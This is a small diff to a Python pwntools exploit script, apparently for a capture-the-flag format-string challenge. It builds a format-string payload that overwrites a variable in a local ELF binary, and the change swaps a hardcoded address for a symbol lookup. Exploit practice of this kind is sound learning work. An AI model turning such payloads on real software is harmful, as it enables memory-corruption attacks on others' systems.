@@ -8,7 +8,7 @@ p = ELF(fname)
 if __name__ == '__main__':
 	context.clear(arch = 'amd64')
 	
-	target = 0x40405c
+	target = p.sym['c']
 	mal_payload = fmtstr_payload(6,{target:0xaa})
 	
 
